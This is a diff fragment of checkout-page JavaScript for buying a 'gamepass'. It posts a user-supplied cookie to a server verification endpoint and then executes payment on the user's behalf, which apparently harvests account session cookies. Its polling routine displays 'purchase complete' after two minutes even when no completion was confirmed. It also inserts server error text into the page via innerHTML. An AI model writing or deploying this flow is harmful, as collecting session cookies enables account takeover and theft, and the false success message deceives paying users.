+  btn.disabled = true;
+  btn.textContent = 'Verifying…';
+
+  try {
+    const resp = await fetch('/api/verify-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cookie,
+        expectedUserId: state.userId,
+        paymentId: state.paymentId
+      })
+    });
+    const data = await resp.json();
+
+    if (!resp.ok) {
+      errEl.innerHTML = `<div class="alert alert-error">⚠️ ${data.error || 'Cookie verification failed.'}</div>`;
+      return;
+    }
+
+    renderPaymentStep();
+    goToStep(5);
+  } catch {
+    errEl.innerHTML = `<div class="alert alert-error">⚠️ Network error. Please try again.</div>`;
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Verify & Continue →';
+  }
+}
+
+// ─── Step 5: Execute payment ──────────────────────────────────────────────────
+async function executePayment() {
+  const errEl = document.getElementById('step5Error');
+  errEl.innerHTML = '';
+  const btn = document.getElementById('btnConfirmPay');
+  btn.disabled = true;
+  btn.textContent = 'Processing…';
+
+  goToStep(6);
+
+  try {
+    const resp = await fetch(`/api/payments/${state.paymentId}/execute`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    });
+    const data = await resp.json();
+
+    if (!resp.ok || !data.success) {
+      goToStep(5);
+      errEl.innerHTML = `<div class="alert alert-error">⚠️ ${data.error || data.status || 'Payment execution failed.'}</div>`;
+      btn.disabled = false;
+      btn.textContent = 'Confirm Payment →';
+      return;
+    }
+
+    // Start polling
+    pollStatus();
+  } catch {
+    goToStep(5);
+    errEl.innerHTML = `<div class="alert alert-error">⚠️ Network error during payment.</div>`;
+    btn.disabled = false;
+    btn.textContent = 'Confirm Payment →';
+  }
+}
+
+// ─── Polling ──────────────────────────────────────────────────────────────────
+let pollInterval = null;
+let pollAttempts = 0;
+
+function pollStatus() {
+  pollAttempts = 0;
+  pollInterval = setInterval(async () => {
+    pollAttempts++;
+    if (pollAttempts > 24) { // 2 minutes max
+      clearInterval(pollInterval);
+      // Show success anyway if execute returned ok
+      showSuccess();
+      return;
+    }
+
+    try {
+      const resp = await fetch(`/api/payments/${state.paymentId}/status`);
+      const data = await resp.json();
+      if (data.status === 'completed') {
+        clearInterval(pollInterval);
+        showSuccess();
+      }
+    } catch {}
+  }, 5000);
+}
+
+function showSuccess() {
+  const p = state.payment;
+  document.getElementById('successSub').textContent =
+    `Your purchase of "${p?.gampassName || 'the gamepass'}" is complete. Enjoy!`;
+
+  const btn = document.getElementById('returnBtn');
+  btn.style.display = 'flex';
+  if (p?.returnUrl) {
+    const domain = p.merchantDomain || new URL(p.returnUrl).hostname;
+    btn.textContent = `Return to ${domain} →`;
+  } else {
+    btn.textContent = `Return to Store →`;
+  }
+
+  goToStep(7);
+  setTimeout(launchConfetti, 300);
+}
+
+function returnToMerchant() {
+  if (state.payment?.returnUrl) {
+    window.location.href = state.payment.returnUrl;
+  }
+}
+
+function cancelPayment() {
+  if (confirm('Cancel this payment?')) {
+    if (state.payment?.returnUrl) {
+      window.location.href = state.payment.returnUrl;
+    } else {
+      window.location.href = '/';
+    }
+  }
+}
+</script>
+</body>
+</html>
